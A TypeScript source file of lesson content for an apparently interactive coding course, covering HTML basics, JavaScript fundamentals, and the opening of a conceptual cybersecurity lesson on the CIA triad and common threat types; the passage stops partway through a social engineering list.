// Comprehensive lesson content database
// Each lesson has detailed explanations, code examples, and try-it-yourself exercises

export interface LessonContent {
  id: string;
  title: string;
  tableOfContents: { id: string; title: string }[];
  content: string;
  code?: {
    html: string;
    css: string;
    js: string;
  };
  quiz?: {
    question: string;
    options: string[];
    correctIndex: number;
  }[];
}

export const lessonContents: Record<string, LessonContent> = {
  // ===============================
  // HTML & CSS FUNDAMENTALS COURSE
  // ===============================
  "html-1": {
    id: "html-1",
    title: "Introduction to HTML",
    tableOfContents: [
      { id: "what-is-html", title: "What is HTML?" },
      { id: "html-structure", title: "HTML Document Structure" },
      { id: "elements-tags", title: "Elements and Tags" },
      { id: "first-page", title: "Your First Web Page" },
      { id: "try-it", title: "Try It Yourself" },
    ],
    content: `
<section id="what-is-html">
<h2>What is HTML?</h2>
<p><strong>HTML (HyperText Markup Language)</strong> is the standard markup language for creating web pages. It describes the structure of a web page using elements that tell the browser how to display content.</p>

<div class="info-box">
<h4>📌 Key Facts About HTML:</h4>
<ul>
<li>HTML stands for <strong>HyperText Markup Language</strong></li>
<li>It is NOT a programming language - it's a <strong>markup language</strong></li>
<li>HTML elements tell the browser how to display content</li>
<li>Every website you visit uses HTML as its foundation</li>
<li>The current version is <strong>HTML5</strong> (released in 2014)</li>
</ul>
</div>

<p>HTML was created by <strong>Tim Berners-Lee</strong> in 1991 at CERN. Since then, it has evolved through many versions, with HTML5 being the current standard that supports modern web features like video, audio, and canvas graphics.</p>
</section>

<section id="html-structure">
<h2>HTML Document Structure</h2>
<p>Every HTML document follows a basic structure. Think of it like a letter - it has a header (metadata) and a body (the actual content).</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Page Title&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;!-- Your visible content goes here --&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

<div class="explanation-box">
<h4>🔍 Breaking It Down:</h4>
<ul>
<li><code>&lt;!DOCTYPE html&gt;</code> - Declares this is an HTML5 document</li>
<li><code>&lt;html lang="en"&gt;</code> - Root element with language attribute</li>
<li><code>&lt;head&gt;</code> - Contains metadata, title, links to CSS/JS</li>
<li><code>&lt;meta charset="UTF-8"&gt;</code> - Character encoding for special characters</li>
<li><code>&lt;meta name="viewport"&gt;</code> - Ensures proper mobile rendering</li>
<li><code>&lt;title&gt;</code> - The browser tab title</li>
<li><code>&lt;body&gt;</code> - Contains ALL visible page content</li>
</ul>
</div>
</section>

<section id="elements-tags">
<h2>Elements and Tags</h2>
<p>HTML elements are the building blocks of HTML pages. Most elements have three parts:</p>

<div class="code-example">
<pre><code>&lt;tagname&gt;Content goes here...&lt;/tagname&gt;
   ↑                              ↑
Opening tag              Closing tag (with /)</code></pre>
</div>

<h3>Common HTML Elements</h3>
<table class="info-table">
<tr><th>Element</th><th>Purpose</th><th>Example</th></tr>
<tr><td><code>&lt;h1&gt;</code> to <code>&lt;h6&gt;</code></td><td>Headings</td><td>&lt;h1&gt;Main Title&lt;/h1&gt;</td></tr>
<tr><td><code>&lt;p&gt;</code></td><td>Paragraphs</td><td>&lt;p&gt;This is text.&lt;/p&gt;</td></tr>
<tr><td><code>&lt;a&gt;</code></td><td>Links</td><td>&lt;a href="url"&gt;Click&lt;/a&gt;</td></tr>
<tr><td><code>&lt;img&gt;</code></td><td>Images</td><td>&lt;img src="photo.jpg" alt="desc"&gt;</td></tr>
<tr><td><code>&lt;div&gt;</code></td><td>Container/Division</td><td>&lt;div&gt;Group content&lt;/div&gt;</td></tr>
<tr><td><code>&lt;span&gt;</code></td><td>Inline container</td><td>&lt;span&gt;Inline text&lt;/span&gt;</td></tr>
</table>

<h3>Self-Closing Elements</h3>
<p>Some elements don't need a closing tag:</p>
<pre><code>&lt;img src="image.jpg" alt="Description"&gt;
&lt;br&gt;    &lt;!-- Line break --&gt;
&lt;hr&gt;    &lt;!-- Horizontal rule --&gt;
&lt;input type="text"&gt;</code></pre>
</section>

<section id="first-page">
<h2>Your First Web Page</h2>
<p>Let's create a complete, working web page! Copy this code:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;My First Website&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Welcome to My Website!&lt;/h1&gt;
    &lt;p&gt;This is my first paragraph. I'm learning HTML!&lt;/p&gt;
    
    &lt;h2&gt;About Me&lt;/h2&gt;
    &lt;p&gt;I am learning web development to build amazing things.&lt;/p&gt;
    
    &lt;h2&gt;My Hobbies&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li&gt;Coding&lt;/li&gt;
        &lt;li&gt;Learning&lt;/li&gt;
        &lt;li&gt;Building projects&lt;/li&gt;
    &lt;/ul&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

<div class="success-box">
<h4>🎉 Congratulations!</h4>
<p>You now understand the basics of HTML structure. Try the interactive editor below to practice and experiment!</p>
</div>
</section>

<section id="try-it">
<h2>Try It Yourself</h2>
<p>Use the code editor below to experiment with HTML. Try these challenges:</p>
<ul>
<li>✏️ Change the heading text</li>
<li>➕ Add another paragraph</li>
<li>📝 Create an ordered list with <code>&lt;ol&gt;</code> and <code>&lt;li&gt;</code></li>
<li>🔗 Add a link using <code>&lt;a href="https://example.com"&gt;Link Text&lt;/a&gt;</code></li>
</ul>
</section>
    `,
    code: {
      html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>My First Page</title>
</head>
<body>
    <h1>Welcome to HTML!</h1>
    <p>This is my first paragraph.</p>
    <p>Try changing this text!</p>
    
    <h2>My Learning Goals</h2>
    <ul>
        <li>Understand HTML structure</li>
        <li>Learn to create web pages</li>
        <li>Build my first project</li>
    </ul>
    
    <!-- Challenge: Add an ordered list below -->
    
</body>
</html>`,
      css: `body {
  font-family: 'Segoe UI', Arial, sans-serif;
  padding: 30px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  margin: 0;
}

h1 {
  color: white;
  text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
}

h2 {
  color: rgba(255,255,255,0.95);
}

p {
  color: rgba(255,255,255,0.9);
  font-size: 18px;
  line-height: 1.6;
}

ul {
  color: rgba(255,255,255,0.9);
  font-size: 16px;
}

li {
  margin: 8px 0;
}`,
      js: `// JavaScript will be covered in later lessons!
console.log("Welcome to HTML Learning!");
console.log("Check the preview on the right to see your page.");`
    },
    quiz: [
      {
        question: "What does HTML stand for?",
        options: ["Hyper Text Markup Language", "Home Tool Markup Language", "Hyperlinks Text Mark Language", "Hyper Tool Multi Language"],
        correctIndex: 0
      },
      {
        question: "Which tag is used for the largest heading?",
        options: ["<heading>", "<h6>", "<h1>", "<head>"],
        correctIndex: 2
      }
    ]
  },

  "html-2": {
    id: "html-2",
    title: "HTML Elements & Tags",
    tableOfContents: [
      { id: "headings", title: "Headings" },
      { id: "paragraphs", title: "Paragraphs & Text Formatting" },
      { id: "links", title: "Links & Navigation" },
      { id: "images", title: "Images" },
      { id: "lists", title: "Lists" },
      { id: "semantic", title: "Semantic HTML5" },
    ],
    content: `
<section id="headings">
<h2>Headings</h2>
<p>HTML provides six levels of headings, from <code>&lt;h1&gt;</code> (most important) to <code>&lt;h6&gt;</code> (least important).</p>

<pre><code>&lt;h1&gt;Main Title - Use Once Per Page&lt;/h1&gt;
&lt;h2&gt;Section Heading&lt;/h2&gt;
&lt;h3&gt;Subsection Heading&lt;/h3&gt;
&lt;h4&gt;Minor Heading&lt;/h4&gt;
&lt;h5&gt;Small Heading&lt;/h5&gt;
&lt;h6&gt;Smallest Heading&lt;/h6&gt;</code></pre>

<div class="tip-box">
<h4>💡 SEO Best Practice:</h4>
<p>Use only <strong>ONE <code>&lt;h1&gt;</code> per page</strong> - it should describe the page's main topic. Search engines use headings to understand your content structure.</p>
</div>
</section>

<section id="paragraphs">
<h2>Paragraphs & Text Formatting</h2>
<p>Paragraphs are created with the <code>&lt;p&gt;</code> tag. Here are essential text formatting elements:</p>

<pre><code>&lt;p&gt;This is a normal paragraph.&lt;/p&gt;

&lt;p&gt;This has &lt;strong&gt;bold/important&lt;/strong&gt; text.&lt;/p&gt;
&lt;p&gt;This has &lt;em&gt;italic/emphasized&lt;/em&gt; text.&lt;/p&gt;
&lt;p&gt;This has &lt;mark&gt;highlighted&lt;/mark&gt; text.&lt;/p&gt;
&lt;p&gt;This is &lt;del&gt;deleted&lt;/del&gt; and &lt;ins&gt;inserted&lt;/ins&gt;.&lt;/p&gt;
&lt;p&gt;This is &lt;sub&gt;subscript&lt;/sub&gt; and &lt;sup&gt;superscript&lt;/sup&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Inline code looks like this&lt;/code&gt;&lt;/p&gt;</code></pre>

<div class="warning-box">
<h4>⚠️ Avoid Deprecated Tags:</h4>
<p>Don't use <code>&lt;b&gt;</code> or <code>&lt;i&gt;</code> for styling. Use <code>&lt;strong&gt;</code> and <code>&lt;em&gt;</code> instead - they have semantic meaning for accessibility.</p>
</div>
</section>

<section id="links">
<h2>Links & Navigation</h2>
<p>The anchor tag <code>&lt;a&gt;</code> creates hyperlinks. The <code>href</code> attribute specifies the destination.</p>

<pre><code>&lt;!-- External link --&gt;
&lt;a href="https://google.com"&gt;Go to Google&lt;/a&gt;

&lt;!-- Open in new tab (recommended for external links) --&gt;
&lt;a href="https://google.com" target="_blank" rel="noopener noreferrer"&gt;
  Open in New Tab
&lt;/a&gt;

&lt;!-- Link to another page on your site --&gt;
&lt;a href="about.html"&gt;About Us&lt;/a&gt;
&lt;a href="/contact"&gt;Contact (absolute path)&lt;/a&gt;

&lt;!-- Link to a section on the same page --&gt;
&lt;a href="#section-id"&gt;Jump to Section&lt;/a&gt;

&lt;!-- Email link --&gt;
&lt;a href="mailto:hello@example.com"&gt;Email Us&lt;/a&gt;

&lt;!-- Phone link (great for mobile) --&gt;
&lt;a href="tel:+1234567890"&gt;Call Us&lt;/a&gt;</code></pre>

<div class="tip-box">
<h4>💡 Security Tip:</h4>
<p>Always add <code>rel="noopener noreferrer"</code> when using <code>target="_blank"</code> to prevent security vulnerabilities.</p>
</div>
</section>

<section id="images">
<h2>Images</h2>
<p>Images are added with the self-closing <code>&lt;img&gt;</code> tag.</p>

<pre><code>&lt;!-- Basic image --&gt;
&lt;img src="photo.jpg" alt="A beautiful sunset over the ocean"&gt;

&lt;!-- With dimensions (helps prevent layout shift) --&gt;
&lt;img src="photo.jpg" alt="Description" width="800" height="600"&gt;

&lt;!-- External image URL --&gt;
&lt;img src="https://example.com/image.png" alt="Description"&gt;

&lt;!-- Figure with caption (semantic) --&gt;
&lt;figure&gt;
  &lt;img src="chart.png" alt="Sales chart for Q4 2024"&gt;
  &lt;figcaption&gt;Figure 1: Quarterly sales data&lt;/figcaption&gt;
&lt;/figure&gt;</code></pre>

<div class="warning-box">
<h4>⚠️ Always Use Alt Text!</h4>
<p>The <code>alt</code> attribute is <strong>essential</strong> for:</p>
<ul>
<li>Screen readers (accessibility)</li>
<li>When images fail to load</li>
<li>SEO - search engines can't "see" images</li>
</ul>
</div>
</section>

<section id="lists">
<h2>Lists</h2>
<p>HTML supports three types of lists:</p>

<h3>Unordered List (bullets)</h3>
<pre><code>&lt;ul&gt;
    &lt;li&gt;First item&lt;/li&gt;
    &lt;li&gt;Second item&lt;/li&gt;
    &lt;li&gt;Third item&lt;/li&gt;
&lt;/ul&gt;</code></pre>

<h3>Ordered List (numbers)</h3>
<pre><code>&lt;ol&gt;
    &lt;li&gt;Step 1: Plan&lt;/li&gt;
    &lt;li&gt;Step 2: Build&lt;/li&gt;
    &lt;li&gt;Step 3: Test&lt;/li&gt;
&lt;/ol&gt;

&lt;!-- Start from a different number --&gt;
&lt;ol start="5"&gt;
    &lt;li&gt;Fifth item&lt;/li&gt;
&lt;/ol&gt;</code></pre>

<h3>Description List</h3>
<pre><code>&lt;dl&gt;
    &lt;dt&gt;HTML&lt;/dt&gt;
    &lt;dd&gt;HyperText Markup Language&lt;/dd&gt;
    
    &lt;dt&gt;CSS&lt;/dt&gt;
    &lt;dd&gt;Cascading Style Sheets&lt;/dd&gt;
&lt;/dl&gt;</code></pre>
</section>

<section id="semantic">
<h2>Semantic HTML5</h2>
<p>Semantic elements clearly describe their meaning to both browsers and developers:</p>

<pre><code>&lt;header&gt;Site header, logo, navigation&lt;/header&gt;
&lt;nav&gt;Navigation links&lt;/nav&gt;
&lt;main&gt;Main content of the page&lt;/main&gt;
&lt;article&gt;Self-contained content (blog post, news article)&lt;/article&gt;
&lt;section&gt;Thematic grouping of content&lt;/section&gt;
&lt;aside&gt;Sidebar, related content&lt;/aside&gt;
&lt;footer&gt;Footer with copyright, links&lt;/footer&gt;</code></pre>

<div class="success-box">
<h4>✅ Why Semantic HTML Matters:</h4>
<ul>
<li>Better accessibility for screen readers</li>
<li>Improved SEO</li>
<li>Easier to read and maintain code</li>
<li>Better browser compatibility</li>
</ul>
</div>
</section>
    `,
    code: {
      html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HTML Elements Practice</title>
</head>
<body>
    <header>
        <h1>My Learning Journal</h1>
        <nav>
            <a href="#about">About</a> |
            <a href="#skills">Skills</a> |
            <a href="#contact">Contact</a>
        </nav>
    </header>
    
    <main>
        <section id="about">
            <h2>About Me</h2>
            <p>Hi! I'm learning <strong>HTML</strong> and <em>web development</em>.</p>
            <p>This is my journey to become a <mark>full-stack developer</mark>.</p>
        </section>
        
        <section id="skills">
            <h2>Skills I'm Learning</h2>
            <ul>
                <li>HTML5</li>
                <li>CSS3</li>
                <li>JavaScript</li>
            </ul>
            
            <h3>My Learning Steps</h3>
            <ol>
                <li>Master the basics</li>
                <li>Build projects</li>
                <li>Learn frameworks</li>
            </ol>
        </section>
        
        <section id="contact">
            <h2>Get In Touch</h2>
            <p>
                <a href="mailto:hello@example.com">Email me</a> |
                <a href="https://github.com" target="_blank" rel="noopener">GitHub</a>
            </p>
        </section>
    </main>
    
    <footer>
        <p>&copy; 2024 My Learning Journal</p>
    </footer>
</body>
</html>`,
      css: `* {
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', system-ui, sans-serif;
  line-height: 1.6;
  max-width: 900px;
  margin: 0 auto;
  padding: 20px;
  background: linear-gradient(180deg, #f8fafc 0%, #e2e8f0 100%);
  min-height: 100vh;
}

header {
  background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
  color: white;
  padding: 20px;
  border-radius: 12px;
  margin-bottom: 20px;
}

header h1 {
  margin: 0 0 10px 0;
}

nav a {
  color: rgba(255,255,255,0.9);
  text-decoration: none;
  padding: 5px 10px;
  border-radius: 4px;
  transition: background 0.2s;
}

nav a:hover {
  background: rgba(255,255,255,0.2);
}

main {
  background: white;
  padding: 30px;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
}

section {
  margin-bottom: 30px;
  padding-bottom: 20px;
  border-bottom: 1px solid #e5e7eb;
}

section:last-child {
  border-bottom: none;
  margin-bottom: 0;
}

h2 {
  color: #1e40af;
  margin-top: 0;
}

h3 {
  color: #3b82f6;
}

a {
  color: #3b82f6;
}

mark {
  background: #fef08a;
  padding: 2px 6px;
  border-radius: 3px;
}

footer {
  text-align: center;
  padding: 20px;
  color: #64748b;
}`,
      js: `// Welcome to the HTML Elements lesson!
console.log("🎉 Page loaded successfully!");

// Count elements on the page
const headings = document.querySelectorAll('h1, h2, h3').length;
const links = document.querySelectorAll('a').length;
const lists = document.querySelectorAll('ul, ol').length;

console.log("📊 Page Statistics:");
console.log("   Headings:", headings);
console.log("   Links:", links);
console.log("   Lists:", lists);`
    }
  },

  // ===============================
  // JAVASCRIPT FUNDAMENTALS
  // ===============================
  "js-1": {
    id: "js-1",
    title: "JavaScript Basics",
    tableOfContents: [
      { id: "what-is-js", title: "What is JavaScript?" },
      { id: "variables", title: "Variables (let, const, var)" },
      { id: "data-types", title: "Data Types" },
      { id: "operators", title: "Operators" },
      { id: "console", title: "Using the Console" },
      { id: "try-it", title: "Try It Yourself" },
    ],
    content: `
<section id="what-is-js">
<h2>What is JavaScript?</h2>
<p>JavaScript is the <strong>programming language of the web</strong>. While HTML provides structure and CSS handles styling, JavaScript adds <strong>interactivity and dynamic behavior</strong>.</p>

<div class="info-box">
<h4>🚀 JavaScript Can:</h4>
<ul>
<li>Change HTML content and CSS styles dynamically</li>
<li>React to user events (clicks, typing, scrolling)</li>
<li>Validate form data before submission</li>
<li>Fetch data from servers (APIs)</li>
<li>Create games, animations, and complex applications</li>
<li>Run on servers (Node.js), mobile apps, and even IoT devices</li>
</ul>
</div>

<p>JavaScript was created by <strong>Brendan Eich</strong> in just 10 days in 1995. Today, it's the most popular programming language in the world, running on every web browser.</p>
</section>

<section id="variables">
<h2>Variables (let, const, var)</h2>
<p>Variables are containers for storing data values. Modern JavaScript uses three keywords:</p>

<pre><code>// 🟢 const - Cannot be reassigned (use by default!)
const PI = 3.14159;
const name = "Alice";
// PI = 3; // ❌ Error! Cannot reassign

// 🟡 let - Can be reassigned (when value changes)
let score = 0;
score = 100; // ✅ This works
let age = 25;
age = 26; // Age changed

// 🔴 var - Old way (avoid using!)
var oldStyle = "don't use this";</code></pre>

<div class="tip-box">
<h4>💡 Modern Best Practice:</h4>
<ol>
<li>Use <code>const</code> by default</li>
<li>Only use <code>let</code> when you know the value will change</li>
<li>Never use <code>var</code> in modern JavaScript</li>
</ol>
</div>

<h3>Naming Rules</h3>
<pre><code>// ✅ Valid variable names
let userName = "John";      // camelCase (recommended)
let user_name = "John";     // snake_case
let _private = true;        // underscore prefix
let $price = 99.99;         // dollar sign

// ❌ Invalid names
// let 2fast = "car";       // Can't start with number
// let my-name = "John";    // No hyphens
// let let = "value";       // Can't use reserved words</code></pre>
</section>

<section id="data-types">
<h2>Data Types</h2>
<p>JavaScript has <strong>8 data types</strong>. Here are the most common:</p>

<pre><code>// 📝 String - Text (use quotes)
let greeting = "Hello, World!";
let name = 'John';           // Single or double quotes
let template = \`Hello \${name}\`; // Template literal (backticks)

// 🔢 Number - Integers and decimals
let age = 25;
let price = 19.99;
let negative = -10;
let infinity = Infinity;

// ✅ Boolean - true or false
let isLoggedIn = true;
let hasError = false;

// 📦 Array - Ordered list of values
let colors = ["red", "green", "blue"];
let mixed = [1, "two", true, null];
console.log(colors[0]); // "red" (index starts at 0)

// 🗂️ Object - Key-value pairs
let person = {
    name: "John",
    age: 30,
    city: "New York",
    isStudent: false
};
console.log(person.name); // "John"
console.log(person["age"]); // 30

// ❓ Undefined - Variable declared but not assigned
let unknown;
console.log(unknown); // undefined

// 🚫 Null - Intentionally empty
let empty = null;

// Check types with typeof
console.log(typeof "hello");  // "string"
console.log(typeof 42);       // "number"
console.log(typeof true);     // "boolean"
console.log(typeof [1,2,3]);  // "object" (arrays are objects!)
console.log(typeof null);     // "object" (historical bug)</code></pre>
</section>

<section id="operators">
<h2>Operators</h2>

<h3>Arithmetic Operators</h3>
<pre><code>let a = 10;
let b = 3;

console.log(a + b);   // 13 (addition)
console.log(a - b);   // 7  (subtraction)
console.log(a * b);   // 30 (multiplication)
console.log(a / b);   // 3.33... (division)
console.log(a % b);   // 1  (remainder/modulo)
console.log(a ** b);  // 1000 (exponent: 10³)

// Increment & Decrement
let count = 5;
count++;  // Now 6
count--;  // Back to 5</code></pre>

<h3>Comparison Operators</h3>
<pre><code>// ⚠️ Loose equality (type coercion - avoid!)
console.log(5 == "5");    // true (converts string to number)
console.log(0 == false);  // true

// ✅ Strict equality (recommended!)
console.log(5 === "5");   // false (different types)
console.log(5 === 5);     // true

// Other comparisons
console.log(5 !== "5");   // true (strict not equal)
console.log(5 > 3);       // true
console.log(5 < 3);       // false
console.log(5 >= 5);      // true
console.log(5 <= 4);      // false</code></pre>

<h3>Logical Operators</h3>
<pre><code>// AND (&&) - All must be true
console.log(true && true);   // true
console.log(true && false);  // false

// OR (||) - At least one must be true
console.log(true || false);  // true
console.log(false || false); // false

// NOT (!) - Inverts the value
console.log(!true);   // false
console.log(!false);  // true

// Practical example
let age = 25;
let hasLicense = true;
let canDrive = age >= 18 && hasLicense; // true</code></pre>
</section>

<section id="console">
<h2>Using the Console</h2>
<p>The console is your <strong>best friend for debugging</strong>! Open it with F12 or right-click → Inspect → Console.</p>

<pre><code>// Basic logging
console.log("Hello World!");
console.log("Multiple", "values", 123);

// Warning and Error
console.warn("⚠️ This is a warning!");
console.error("❌ This is an error!");

// Logging objects
const user = { name: "John", age: 30 };
console.log(user);            // Shows object
console.table(user);          // Shows as table

// Logging arrays
const numbers = [1, 2, 3, 4, 5];
console.table(numbers);

// Grouping logs
console.group("User Details");
console.log("Name: John");
console.log("Age: 30");
console.groupEnd();

// Timing code
console.time("Loop");
for(let i = 0; i < 1000000; i++) { /* do nothing */ }
console.timeEnd("Loop"); // Shows execution time</code></pre>

<div class="success-box">
<h4>🎯 Pro Tip:</h4>
<p>Use <code>console.log()</code> liberally when debugging. It's the fastest way to understand what your code is doing!</p>
</div>
</section>

<section id="try-it">
<h2>Try It Yourself</h2>
<p>Open the console tab in the preview to see your JavaScript output! Try:</p>
<ul>
<li>Create variables with different data types</li>
<li>Perform calculations</li>
<li>Use console.log() to display results</li>
<li>Access object properties</li>
</ul>
</section>
    `,
    code: {
      html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>JavaScript Basics</title>
</head>
<body>
    <h1>JavaScript Playground</h1>
    <p id="output">Click a button to see JavaScript in action!</p>
    
    <div class="buttons">
        <button onclick="greetUser()">Greet Me</button>
        <button onclick="calculate()">Do Math</button>
        <button onclick="showData()">Show Data Types</button>
        <button onclick="showObject()">Show Object</button>
    </div>
    
    <div id="result" class="result-box"></div>
</body>
</html>`,
      css: `body {
  font-family: 'Segoe UI', system-ui, sans-serif;
  padding: 30px;
  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
  min-height: 100vh;
  margin: 0;
  color: white;
}

h1 {
  color: #00d4ff;
  margin-bottom: 10px;
}

#output {
  background: rgba(0, 212, 255, 0.1);
  padding: 20px;
  border-radius: 10px;
  border: 1px solid #00d4ff;
  margin: 20px 0;
}

.buttons {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin: 20px 0;
}

button {
  background: #00d4ff;
  color: #1a1a2e;
  border: none;
  padding: 12px 24px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: bold;
  font-size: 14px;
  transition: transform 0.2s, box-shadow 0.2s;
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 212, 255, 0.4);
}

.result-box {
  background: rgba(0, 0, 0, 0.3);
  padding: 20px;
  border-radius: 10px;
  font-family: 'Monaco', 'Consolas', monospace;
  white-space: pre-wrap;
  min-height: 100px;
}`,
      js: `// Variables
const appName = "JavaScript Playground";
let userName = "Learner";
let clickCount = 0;

// Function to greet user
function greetUser() {
  clickCount++;
  const greeting = "Hello, " + userName + "!";
  const message = greeting + "\\nYou've clicked " + clickCount + " time(s).";
  
  document.getElementById("output").textContent = message;
  document.getElementById("result").textContent = "Console output:\\n" + greeting;
  
  console.log("👋 " + greeting);
  console.log("Click count:", clickCount);
}

// Function to do math
function calculate() {
  const a = 10;
  const b = 3;
  
  const results = [
    a + " + " + b + " = " + (a + b),
    a + " - " + b + " = " + (a - b),
    a + " * " + b + " = " + (a * b),
    a + " / " + b + " = " + (a / b).toFixed(2),
    a + " % " + b + " = " + (a % b),
    a + " ** " + b + " = " + (a ** b)
  ];
  
  document.getElementById("output").textContent = "Math Results:";
  document.getElementById("result").textContent = results.join("\\n");
  
  console.log("🔢 Math operations:");
  results.forEach(r => console.log("  " + r));
}

// Function to show data types
function showData() {
  const examples = {
    string: "Hello",
    number: 42,
    boolean: true,
    array: [1, 2, 3],
    nullValue: null,
    undefinedValue: undefined
  };
  
  let output = "Data Types:\\n";
  for (let key in examples) {
    output += key + ": " + JSON.stringify(examples[key]) + 
              " (type: " + typeof examples[key] + ")\\n";
  }
  
  document.getElementById("output").textContent = "Data Types Demo";
  document.getElementById("result").textContent = output;
  
  console.log("📊 Data types:");
  console.table(examples);
}

// Function to show object
function showObject() {
  const person = {
    name: "John Doe",
    age: 30,
    skills: ["JavaScript", "HTML", "CSS"],
    isEmployed: true,
    address: {
      city: "New York",
      country: "USA"
    }
  };
  
  document.getElementById("output").textContent = "Object Example";
  document.getElementById("result").textContent = JSON.stringify(person, null, 2);
  
  console.log("👤 Person object:");
  console.log(person);
  console.table(person.skills);
}

// Initial message
console.log("🚀 Welcome to " + appName + "!");
console.log("📌 Click the buttons above to see JavaScript in action.");
console.log("💡 Open this console to see detailed output.");`
    }
  },

  // ===============================
  // CYBERSECURITY FUNDAMENTALS
  // ===============================
  "cyber-1": {
    id: "cyber-1",
    title: "Introduction to Cybersecurity",
    tableOfContents: [
      { id: "what-is-cybersecurity", title: "What is Cybersecurity?" },
      { id: "why-important", title: "Why is it Important?" },
      { id: "cia-triad", title: "The CIA Triad" },
      { id: "threats", title: "Common Threats" },
      { id: "defense-layers", title: "Defense in Depth" },
      { id: "careers", title: "Career Paths" },
    ],
    content: `
<section id="what-is-cybersecurity">
<h2>What is Cybersecurity?</h2>
<p><strong>Cybersecurity</strong> is the practice of protecting systems, networks, programs, and data from digital attacks. These attacks typically aim to access, change, or destroy sensitive information, extort money, or disrupt normal business operations.</p>

<div class="info-box">
<h4>🛡️ Cybersecurity Domains:</h4>
<ul>
<li><strong>Network Security</strong> - Protecting computer networks from intruders</li>
<li><strong>Application Security</strong> - Keeping software and devices free of threats</li>
<li><strong>Information Security</strong> - Protecting data integrity and privacy</li>
<li><strong>Operational Security (OpSec)</strong> - Processes for handling data assets</li>
<li><strong>Disaster Recovery</strong> - Responding to and recovering from incidents</li>
<li><strong>End-user Education</strong> - Teaching security awareness</li>
</ul>
</div>

<p>The global cybersecurity market is projected to reach <strong>$366 billion by 2028</strong>, with millions of unfilled cybersecurity jobs worldwide. It's one of the fastest-growing and most in-demand fields in technology.</p>
</section>

<section id="why-important">
<h2>Why is Cybersecurity Important?</h2>
<p>In our increasingly digital world, cybersecurity has never been more critical:</p>

<div class="stats-grid">
<div class="stat-card">
<h3>$4.45M</h3>
<p>Average cost of a data breach in 2023</p>
</div>
<div class="stat-card">
<h3>43%</h3>
<p>Of cyber attacks target small businesses</p>
</div>
<div class="stat-card">
<h3>3.5M</h3>
<p>Unfilled cybersecurity jobs globally</p>
</div>
<div class="stat-card">
<h3>287 days</h3>
<p>Average time to identify a breach</p>
</div>
</div>

<div class="warning-box">
<h4>⚠️ Real-World Impact:</h4>
<ul>
<li><strong>Colonial Pipeline (2021)</strong> - Ransomware attack shut down fuel supply for US East Coast</li>
<li><strong>SolarWinds (2020)</strong> - Supply chain attack affected 18,000+ organizations</li>
<li><strong>Equifax (2017)</strong> - 147 million people's personal data exposed</li>
<li><strong>WannaCry (2017)</strong> - Ransomware affected 200,000+ computers in 150 countries</li>
</ul>
</div>
</section>

<section id="cia-triad">
<h2>The CIA Triad</h2>
<p>The <strong>CIA Triad</strong> is the foundational model for information security:</p>

<div class="highlight-box" style="border-left-color: #3b82f6;">
<h3>🔒 Confidentiality</h3>
<p>Ensuring information is accessible <strong>only to authorized users</strong>.</p>
<ul>
<li><strong>Implementation:</strong> Encryption, access controls, authentication</li>
<li><strong>Example:</strong> Only you can read your encrypted emails</li>
<li><strong>Threat:</strong> Data breaches, eavesdropping, social engineering</li>
</ul>
</div>

<div class="highlight-box" style="border-left-color: #10b981;">
<h3>✅ Integrity</h3>
<p>Maintaining <strong>accuracy and completeness</strong> of data. Data should not be modified without authorization.</p>
<ul>
<li><strong>Implementation:</strong> Hashing, digital signatures, checksums, version control</li>
<li><strong>Example:</strong> Bank transaction records remain unaltered</li>
<li><strong>Threat:</strong> Man-in-the-middle attacks, malware, SQL injection</li>
</ul>
</div>

<div class="highlight-box" style="border-left-color: #f59e0b;">
<h3>⚡ Availability</h3>
<p>Ensuring <strong>authorized users can access</strong> information and resources when needed.</p>
<ul>
<li><strong>Implementation:</strong> Redundancy, backups, disaster recovery, DDoS protection</li>
<li><strong>Example:</strong> A hospital's systems remain operational 24/7</li>
<li><strong>Threat:</strong> DDoS attacks, hardware failure, natural disasters</li>
</ul>
</div>
</section>

<section id="threats">
<h2>Common Cyber Threats</h2>
<p>Understanding threats is the first step to defense:</p>

<h3>🦠 Malware</h3>
<p>Malicious software designed to harm systems:</p>
<ul>
<li><strong>Virus</strong> - Attaches to legitimate programs, spreads when executed</li>
<li><strong>Worm</strong> - Self-replicating, spreads across networks automatically</li>
<li><strong>Trojan</strong> - Disguised as legitimate software</li>
<li><strong>Ransomware</strong> - Encrypts files, demands payment</li>
<li><strong>Spyware</strong> - Secretly monitors user activity</li>
<li><strong>Keylogger</strong> - Records keystrokes to steal credentials</li>
</ul>

<h3>🎣 Phishing</h3>
<p>Fraudulent attempts to obtain sensitive information:</p>
<ul>
<li><strong>Email Phishing</strong> - Fake emails impersonating trusted entities</li>
<li><strong>Spear Phishing</strong> - Targeted attacks on specific individuals</li>
<li><strong>Whaling</strong> - Targeting high-profile executives</li>
<li><strong>Smishing</strong> - Phishing via SMS</li>
<li><strong>Vishing</strong> - Voice/phone phishing</li>
</ul>

<h3>👤 Social Engineering</h3>
<p>Manipulating people into revealing confidential information:</p>
<ul>
<li><strong>Pretexting</strong> - Creating a fabricated scenario</li>
<li><strong>Baiting</strong> - Leaving infected USB drives</li>
